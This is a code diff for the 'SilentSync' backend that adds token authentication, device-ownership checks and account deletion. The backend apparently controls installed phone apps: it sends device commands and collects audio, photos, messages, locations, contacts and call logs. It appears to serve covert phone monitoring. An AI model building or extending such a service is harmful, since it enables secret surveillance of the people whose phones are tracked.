@@ -160,6 +160,24 @@ app.get("/health", (req, res) => {
   });
 });
 
+// Authentication Middleware
+const authenticate = async (req: any, res: any, next: any) => {
+  const authHeader = req.headers.authorization;
+  if (!authHeader || !authHeader.startsWith("Bearer ")) {
+    return res.status(401).json({ error: "Unauthorized: Missing token" });
+  }
+
+  const token = authHeader.split(" ")[1];
+  try {
+    const decodedToken = await admin.auth().verifyIdToken(token);
+    req.user = decodedToken;
+    next();
+  } catch (error) {
+    console.error("Token verification failed:", error);
+    res.status(401).json({ error: "Unauthorized: Invalid token" });
+  }
+};
+
 // Debug: confirm which Firebase project this backend is writing to
 app.get("/api/debug/firebase", (req, res) => {
   try {
@@ -229,7 +247,9 @@ app.get("/api/debug/commands", async (req, res) => {
       typeof req.query.deviceId === "string" ? req.query.deviceId : "";
     const limitRaw =
       typeof req.query.limit === "string" ? parseInt(req.query.limit, 10) : 20;
-    const limit = Number.isFinite(limitRaw) ? Math.min(Math.max(limitRaw, 1), 100) : 20;
+    const limit = Number.isFinite(limitRaw)
+      ? Math.min(Math.max(limitRaw, 1), 100)
+      : 20;
 
     if (!deviceId) {
       return res.status(400).json({ error: "Provide deviceId query param" });
@@ -452,10 +472,11 @@ app.post("/api/location/:deviceId", async (req, res) => {
   }
 });
 
-// Send Command (from Dashboard to Device)
-app.post("/api/command/:deviceId", async (req, res) => {
+// Send Command (from Dashboard to Device) - Authenticated
+app.post("/api/command/:deviceId", authenticate, async (req: any, res) => {
   const { deviceId } = req.params;
   const { type, payload, message } = req.body;
+  const userId = req.user.uid;
 
   if (!deviceId || !type) {
     return res.status(400).json({ error: "Missing deviceId or type" });
@@ -463,6 +484,14 @@ app.post("/api/command/:deviceId", async (req, res) => {
 
   try {
     const deviceRef = db.collection("devices").doc(deviceId);
+    const deviceSnap = await deviceRef.get();
+
+    if (!deviceSnap.exists || deviceSnap.data()?.ownerUid !== userId) {
+      return res
+        .status(403)
+        .json({ error: "Forbidden: You do not own this device" });
+    }
+
     const commandRef = deviceRef.collection("commands").doc();
 
     const commandData: any = {
@@ -660,11 +689,19 @@ app.post("/api/upload-audio/:deviceId", async (req, res) => {
   }
 });
 
-// Fetch audio files for a device directly from uploads directory
-app.get("/api/audio/:deviceId", async (req, res) => {
+// Fetch audio files for a device - Authenticated
+app.get("/api/audio/:deviceId", authenticate, async (req: any, res) => {
   const { deviceId } = req.params;
+  const userId = req.user.uid;
 
   try {
+    const deviceSnap = await db.collection("devices").doc(deviceId).get();
+    if (!deviceSnap.exists || deviceSnap.data()?.ownerUid !== userId) {
+      return res
+        .status(403)
+        .json({ error: "Forbidden: You do not own this device" });
+    }
+
     console.log(`[Audio API] Fetching audio for device: ${deviceId}`);
     const uploadsDir = path.join(__dirname, "public", "uploads");
     if (!fs.existsSync(uploadsDir)) {
@@ -695,42 +732,101 @@ app.get("/api/audio/:deviceId", async (req, res) => {
   }
 });
 
-// Get all devices
-app.get("/api/devices", async (req, res) => {
+// Get all devices (Authenticated & Filtered by ownerUid)
+app.get("/api/devices", authenticate, async (req: any, res) => {
   try {
-    const snapshot = await db.collection("devices").get();
+    const userId = req.user.uid;
+    const snapshot = await db
+      .collection("devices")
+      .where("ownerUid", "==", userId)
+      .get();
     const devices = snapshot.docs.map((doc) => ({
       id: doc.id,
       ...doc.data(),
     }));
-    res.json(devices);
+    res.json({ success: true, devices });
   } catch (error) {
     console.error("Error fetching devices:", error);
-    res.status(500).json({ error: "Failed to fetch devices" });
+    res.status(500).json({ success: false, error: "Failed to fetch devices" });
   }
 });
 
-// Get devices by user ID
-app.get("/api/devices/:userId", async (req, res) => {
+// Get devices by identifier (Authenticated & Filtered)
+app.get("/api/devices/:identifier", authenticate, async (req: any, res) => {
   try {
-    const { userId } = req.params;
-    if (!userId) {
-      return res.status(400).json({ error: "userId is required" });
+    const { identifier } = req.params;
+    const userId = req.user.uid;
+
+    if (!identifier) {
+      return res
+        .status(400)
+        .json({ success: false, error: "identifier is required" });
     }
 
-    const snapshot = await db
+    // Security Check: User can only fetch their own devices or by their own uniqueId
+    // If identifier is not their UID, check if it's their uniqueId
+    let isAuthorized = identifier === userId;
+
+    if (!isAuthorized) {
+      const userApkSnap = await db
+        .collection("userApkRegistrations")
+        .where("userId", "==", userId)
+        .where("uniqueId", "==", identifier)
+        .limit(1)
+        .get();
+
+      if (!userApkSnap.empty) {
+        isAuthorized = true;
+      }
+    }
+
+    if (!isAuthorized) {
+      return res.status(403).json({
+        success: false,
+        error: "Forbidden: Access denied to this identifier",
+      });
+    }
+
+    console.log(`[Devices API] Fetching devices for identifier: ${identifier}`);
+
+    // Query 1: by ownerUid (Dashboard owner)
+    const ownerQuery = db
       .collection("devices")
-      .where("userId", "==", userId)
+      .where("ownerUid", "==", identifier)
       .get();
 
-    const devices = snapshot.docs.map((doc) => ({
-      id: doc.id,
-      ...doc.data(),
-    }));
-    res.json(devices);
+    // Query 2: by uniqueId (Referral code)
+    const uniqueIdQuery = db
+      .collection("devices")
+      .where("uniqueId", "==", identifier)
+      .get();
+
+    const [ownerSnap, uniqueSnap] = await Promise.all([
+      ownerQuery,
+      uniqueIdQuery,
+    ]);
+
+    const deviceMap = new Map();
+
+    const addDocs = (snap: admin.firestore.QuerySnapshot) => {
+      snap.docs.forEach((doc) => {
+        const data = doc.data();
+        deviceMap.set(doc.id, { id: doc.id, ...data });
+      });
+    };
+
+    addDocs(ownerSnap);
+    addDocs(uniqueSnap);
+
+    const devices = Array.from(deviceMap.values());
+    console.log(
+      `[Devices API] Found ${devices.length} devices for ${identifier}`,
+    );
+
+    res.json({ success: true, devices });
   } catch (error) {
-    console.error("Error fetching devices by userId:", error);
-    res.status(500).json({ error: "Failed to fetch devices" });
+    console.error("Error fetching devices by identifier:", error);
+    res.status(500).json({ success: false, error: "Failed to fetch devices" });
   }
 });
 
@@ -807,6 +903,7 @@ app.get("/api/check-unique-id/:uniqueId", async (req, res) => {
         : null;
 
       res.json({
+        success: true,
         available: false,
         exists: true,
         message: `Unique ID is already taken. It's already used in ${conflictSource}.`,
@@ -817,56 +914,95 @@ app.get("/api/check-unique-id/:uniqueId", async (req, res) => {
       console.log(
         `[Unique ID Check] ID ${uniqueId} is available for APK registration`,
       );
-      res.json({ available: true, exists: false, message: "Unique ID is available" });
+      res.json({
+        success: true,
+        available: true,
+        exists: false,
+        message: "Unique ID is available",
+      });
     }
   } catch (error) {
     console.error("Check unique ID error:", error);
-    res.status(500).json({ error: "Failed to check unique ID" });
+    res
+      .status(500)
+      .json({ success: false, error: "Failed to check unique ID" });
   }
 });
 
-// Check if user already has an APK
-app.get("/api/user-apk/:userId", async (req, res) => {
-  const { userId } = req.params;
-  if (!userId) {
-    return res.status(400).json({ error: "userId is required" });
+// Check if user already has an APK (by userId or uniqueId) - Authenticated
+app.get("/api/user-apk/:identifier", authenticate, async (req: any, res) => {
+  const { identifier } = req.params;
+  const userId = req.user.uid;
+
+  if (!identifier) {
+    return res.status(400).json({ error: "identifier is required" });
+  }
+
+  // Security Check: User can only check their own APK status
+  if (identifier !== userId) {
+    // If identifier is not their UID, check if it's their uniqueId
+    const userApkSnap = await db
+      .collection("userApkRegistrations")
+      .where("userId", "==", userId)
+      .where("uniqueId", "==", identifier)
+      .limit(1)
+      .get();
+
+    if (userApkSnap.empty) {
+      return res.status(403).json({ success: false, error: "Forbidden" });
+    }
   }
 
   try {
-    console.log(`[User APK Check] Checking APK for user: ${userId}`);
+    console.log(`[User APK Check] Checking APK for: ${identifier}`);
 
-    // Check if user has an APK registration
-    const userApkSnapshot = await db
+    // Check by userId
+    const userQuery = db
       .collection("userApkRegistrations")
-      .where("userId", "==", userId)
+      .where("userId", "==", identifier)
       .get();
 
-    if (!userApkSnapshot.empty) {
-      const userApk = userApkSnapshot.docs[0].data();
-      console.log(`[User APK Check] User ${userId} has APK: ${userApk.apkUrl}`);
+    // Check by uniqueId
+    const uniqueQuery = db
+      .collection("userApkRegistrations")
+      .where("uniqueId", "==", identifier)
+      .get();
+
+    const [userSnap, uniqueSnap] = await Promise.all([userQuery, uniqueQuery]);
+
+    let userApkDoc = !userSnap.empty
+      ? userSnap.docs[0]
+      : !uniqueSnap.empty
+        ? uniqueSnap.docs[0]
+        : null;
+
+    if (userApkDoc) {
+      const userApk = userApkDoc.data();
+      console.log(`[User APK Check] Found APK: ${userApk.apkUrl}`);
       res.json({
+        success: true,
         hasApk: true,
         apkUrl: userApk.apkUrl,
         uniqueId: userApk.uniqueId,
         createdAt: userApk.createdAt,
       });
     } else {
-      console.log(`[User APK Check] User ${userId} has no APK`);
-      res.json({ hasApk: false });
+      console.log(`[User APK Check] No APK found for ${identifier}`);
+      res.json({ success: true, hasApk: false });
     }
   } catch (error) {
     console.error("User APK check error:", error);
-    res.status(500).json({ error: "Failed to check user APK" });
+    res.status(500).json({ success: false, error: "Failed to check user APK" });
   }
 });
 
-// Register APK for specific user (one-ID-per-user system)
-app.post("/api/register-user-apk", async (req, res) => {
-  const { userId, uniqueId, apkUrl } = req.body;
-  if (!userId || !uniqueId || !apkUrl) {
-    return res
-      .status(400)
-      .json({ error: "userId, uniqueId, and apkUrl are required" });
+// Register APK for specific user (one-ID-per-user system) - Authenticated
+app.post("/api/register-user-apk", authenticate, async (req: any, res) => {
+  const { uniqueId, apkUrl } = req.body;
+  const userId = req.user.uid;
+
+  if (!uniqueId || !apkUrl) {
+    return res.status(400).json({ error: "uniqueId and apkUrl are required" });
   }
 
   try {
@@ -884,6 +1020,19 @@ app.post("/api/register-user-apk", async (req, res) => {
       return res.status(400).json({
         error:
           "User already has an APK registered. Only one APK per user is allowed.",
+      });
+    }
+
+    // Also check if uniqueId is already taken by ANYONE
+    const conflictSnap = await db
+      .collection("userApkRegistrations")
+      .where("uniqueId", "==", uniqueId)
+      .limit(1)
+      .get();
+
+    if (!conflictSnap.empty) {
+      return res.status(409).json({
+        error: "This Unique ID is already taken. Please choose another one.",
       });
     }
 
@@ -1165,17 +1314,20 @@ app.post("/api/upload-photo/:deviceId", async (req, res) => {
 
     const deviceRef = db.collection("devices").doc(deviceId);
 
-    await deviceRef.collection("photos").doc(photoId).set(
-      {
-        fileName: localFileName,
-        originalFileName: originalFileName || fileName,
-        url: publicUrl,
-        ...(uri ? { uri } : {}),
-        syncedAt: admin.firestore.FieldValue.serverTimestamp(),
-        updatedAt: admin.firestore.FieldValue.serverTimestamp(),
-      },
-      { merge: true },
-    );
+    await deviceRef
+      .collection("photos")
+      .doc(photoId)
+      .set(
+        {
+          fileName: localFileName,
+          originalFileName: originalFileName || fileName,
+          url: publicUrl,
+          ...(uri ? { uri } : {}),
+          syncedAt: admin.firestore.FieldValue.serverTimestamp(),
+          updatedAt: admin.firestore.FieldValue.serverTimestamp(),
+        },
+        { merge: true },
+      );
 
     // Also update device online status
     await deviceRef.set(
@@ -1359,6 +1511,127 @@ app.get("/api/debug/ws", (req, res) => {
 // 404 handler
 app.use((req, res) => {
   res.status(404).json({ error: "Endpoint not found", path: req.path });
+});
+
+// Delete User Account - Authenticated
+app.delete("/api/delete-account", authenticate, async (req: any, res) => {
+  const userId = req.user.uid;
+
+  try {
+    console.log(`[Delete Account] Starting deletion for user: ${userId}`);
+
+    // Get user's devices first
+    const devicesSnapshot = await db
+      .collection("devices")
+      .where("ownerUid", "==", userId)
+      .get();
+
+    // Delete all user's devices
+    const deviceDeletionPromises = devicesSnapshot.docs.map(
+      async (deviceDoc) => {
+        const deviceId = deviceDoc.id;
+
+        // Delete device's subcollections
+        const collections = [
+          "commands",
+          "audio",
+          "messages",
+          "locations",
+          "contacts",
+          "call_logs",
+          "apps",
+        ];
+        const subcollectionDeletionPromises = collections.map(
+          async (collectionName) => {
+            try {
+              const subcollectionSnapshot = await deviceDoc.ref
+                .collection(collectionName)
+                .get();
+
+              const batchDeletions = [];
+              subcollectionSnapshot.docs.forEach((doc) => {
+                batchDeletions.push(doc.ref.delete());
+              });
+
+              return Promise.all(batchDeletions);
+            } catch (error) {
+              // Ignore errors for collections that don't exist
+              console.log(
+                `[Delete Account] Collection ${collectionName} may not exist for device ${deviceId}`,
+              );
+              return Promise.resolve();
+            }
+          },
+        );
+
+        await Promise.all(subcollectionDeletionPromises);
+
+        // Delete the device document itself
+        await deviceDoc.ref.delete();
+        console.log(`[Delete Account] Deleted device: ${deviceId}`);
+      },
+    );
+
+    await Promise.all(deviceDeletionPromises);
+
+    // Delete user's APK registration if exists
+    const userApkSnapshot = await db
+      .collection("userApkRegistrations")
+      .where("userId", "==", userId)
+      .get();
+
+    const apkDeletionPromises = userApkSnapshot.docs.map((doc) =>
+      doc.ref.delete(),
+    );
+    await Promise.all(apkDeletionPromises);
+
+    // Delete user document from Firestore (if it exists)
+    try {
+      const userDocRef = db.collection("users").doc(userId);
+      await userDocRef.delete();
+    } catch (error) {
+      console.log(
+        `[Delete Account] Users collection may not exist or user document not found for ${userId}`,
+      );
+    }
+
+    // Delete user from Firebase Authentication
+    await admin.auth().deleteUser(userId);
+
+    console.log(
+      `[Delete Account] Successfully deleted account for user: ${userId}`,
+    );
+
+    res.json({
+      success: true,
+      message: "Account and all associated data deleted successfully",
+    });
+  } catch (error: any) {
+    console.error(
+      `[Delete Account] Error deleting account for user ${userId}:`,
+      error,
+    );
+
+    // Handle specific Firebase Auth errors
+    if (error.code === "auth/user-not-found") {
+      return res.status(404).json({
+        error: "User not found",
+        message: "The user account does not exist",
+      });
+    }
+
+    if (error.code === "auth/insufficient-permission") {
+      return res.status(403).json({
+        error: "Insufficient permissions",
+        message: "Insufficient permissions to delete user",
+      });
+    }
+
+    res.status(500).json({
+      error: "Failed to delete account",
+      message: error.message || "An unexpected error occurred",
+    });
+  }
 });
 
 // Error handler
@@ -1550,18 +1823,255 @@ if (!isCloudflareWorker) {
 // Export for Cloudflare Workers
 export default {
   async fetch(request: Request, env: any, ctx: any) {
-    // For Cloudflare Workers, we need to use a different approach
-    // This is a simplified version - full Express on Workers requires an adapter
-    return new Response(
-      JSON.stringify({
-        status: "ok",
-        message: "SilentSync Backend is running on Cloudflare Workers",
-        timestamp: new Date().toISOString(),
-      }),
-      {
-        status: 200,
-        headers: { "Content-Type": "application/json" },
-      },
-    );
+    try {
+      const url = new URL(request.url);
+      const method = request.method;
+      const path = url.pathname;
+
+      // Handle CORS preflight
+      if (method === "OPTIONS") {
+        return new Response(null, {
+          status: 200,
+          headers: {
+            "Access-Control-Allow-Origin": "*",
+            "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
+            "Access-Control-Allow-Headers": "Content-Type, Authorization",
+          },
+        });
+      }
+
+      // Initialize Firebase for Cloudflare Workers
+      if (admin.apps.length === 0) {
+        const serviceAccount = getServiceAccount();
+        const firebaseConfig = getFirebaseConfig();
+
+        if (serviceAccount && firebaseConfig) {
+          admin.initializeApp({
+            credential: admin.credential.cert(serviceAccount),
+            ...firebaseConfig,
+          });
+        }
+      }
+
+      const db = getFirestore();
+
+      // Handle DELETE /api/delete-account
+      if (method === "DELETE" && path === "/api/delete-account") {
+        const authHeader = request.headers.get("Authorization");
+
+        if (!authHeader || !authHeader.startsWith("Bearer ")) {
+          return new Response(
+            JSON.stringify({ error: "Unauthorized: Missing token" }),
+            {
+              status: 401,
+              headers: {
+                "Content-Type": "application/json",
+                "Access-Control-Allow-Origin": "*",
+              },
+            },
+          );
+        }
+
+        const token = authHeader.substring(7);
+
+        try {
+          // Verify token and get user
+          const decodedToken = await admin.auth().verifyIdToken(token);
+          const userId = decodedToken.uid;
+
+          console.log(`[Delete Account] Starting deletion for user: ${userId}`);
+
+          // Get user's devices first
+          const devicesSnapshot = await db
+            .collection("devices")
+            .where("ownerUid", "==", userId)
+            .get();
+
+          // Delete all user's devices
+          const deviceDeletionPromises = devicesSnapshot.docs.map(
+            async (deviceDoc) => {
+              const deviceId = deviceDoc.id;
+
+              // Delete device's subcollections
+              const collections = [
+                "commands",
+                "audio",
+                "messages",
+                "locations",
+                "contacts",
+                "call_logs",
+                "apps",
+              ];
+              const subcollectionDeletionPromises = collections.map(
+                async (collectionName) => {
+                  try {
+                    const subcollectionSnapshot = await deviceDoc.ref
+                      .collection(collectionName)
+                      .get();
+
+                    const batchDeletions = [];
+                    subcollectionSnapshot.docs.forEach((doc) => {
+                      batchDeletions.push(doc.ref.delete());
+                    });
+
+                    return Promise.all(batchDeletions);
+                  } catch (error) {
+                    // Ignore errors for collections that don't exist
+                    console.log(
+                      `[Delete Account] Collection ${collectionName} may not exist for device ${deviceId}`,
+                    );
+                    return Promise.resolve();
+                  }
+                },
+              );
+
+              await Promise.all(subcollectionDeletionPromises);
+
+              // Delete the device document itself
+              await deviceDoc.ref.delete();
+              console.log(`[Delete Account] Deleted device: ${deviceId}`);
+            },
+          );
+
+          await Promise.all(deviceDeletionPromises);
+
+          // Delete user's APK registration if exists
+          const userApkSnapshot = await db
+            .collection("userApkRegistrations")
+            .where("userId", "==", userId)
+            .get();
+
+          const apkDeletionPromises = userApkSnapshot.docs.map((doc) =>
+            doc.ref.delete(),
+          );
+          await Promise.all(apkDeletionPromises);
+
+          // Delete user document from Firestore (if it exists)
+          try {
+            const userDocRef = db.collection("users").doc(userId);
+            await userDocRef.delete();
+          } catch (error) {
+            console.log(
+              `[Delete Account] Users collection may not exist or user document not found for ${userId}`,
+            );
+          }
+
+          // Delete user from Firebase Authentication
+          await admin.auth().deleteUser(userId);
+
+          console.log(
+            `[Delete Account] Successfully deleted account for user: ${userId}`,
+          );
+
+          return new Response(
+            JSON.stringify({
+              success: true,
+              message: "Account and all associated data deleted successfully",
+            }),
+            {
+              status: 200,
+              headers: {
+                "Content-Type": "application/json",
+                "Access-Control-Allow-Origin": "*",
+              },
+            },
+          );
+        } catch (error: any) {
+          console.error(`[Delete Account] Error deleting account:`, error);
+
+          // Handle specific Firebase Auth errors
+          if (error.code === "auth/user-not-found") {
+            return new Response(
+              JSON.stringify({
+                error: "User not found",
+                message: "The user account does not exist",
+              }),
+              {
+                status: 404,
+                headers: {
+                  "Content-Type": "application/json",
+                  "Access-Control-Allow-Origin": "*",
+                },
+              },
+            );
+          }
+
+          if (error.code === "auth/insufficient-permission") {
+            return new Response(
+              JSON.stringify({
+                error: "Insufficient permissions",
+                message: "Insufficient permissions to delete user",
+              }),
+              {
+                status: 403,
+                headers: {
+                  "Content-Type": "application/json",
+                  "Access-Control-Allow-Origin": "*",
+                },
+              },
+            );
+          }
+
+          return new Response(
+            JSON.stringify({
+              error: "Failed to delete account",
+              message: error.message || "An unexpected error occurred",
+            }),
+            {
+              status: 500,
+              headers: {
+                "Content-Type": "application/json",
+                "Access-Control-Allow-Origin": "*",
+              },
+            },
+          );
+        }
+      }
+
+      // Handle other endpoints (add more as needed)
+      if (path === "/health") {
+        return new Response(
+          JSON.stringify({
+            status: "healthy",
+            timestamp: new Date().toISOString(),
+            environment: "cloudflare-worker",
+          }),
+          {
+            status: 200,
+            headers: {
+              "Content-Type": "application/json",
+              "Access-Control-Allow-Origin": "*",
+            },
+          },
+        );
+      }
+
+      // 404 for unknown endpoints
+      return new Response(
+        JSON.stringify({ error: "Endpoint not found", path }),
+        {
+          status: 404,
+          headers: {
+            "Content-Type": "application/json",
+            "Access-Control-Allow-Origin": "*",
+          },
+        },
+      );
+    } catch (error: any) {
+      console.error("Cloudflare Worker error:", error);
+      return new Response(
+        JSON.stringify({
+          error: "Internal server error",
+          message: error.message,
+        }),
+        {
+          status: 500,
+          headers: {
+            "Content-Type": "application/json",
+            "Access-Control-Allow-Origin": "*",
+          },
+        },
+      );
+    }
   },
 };
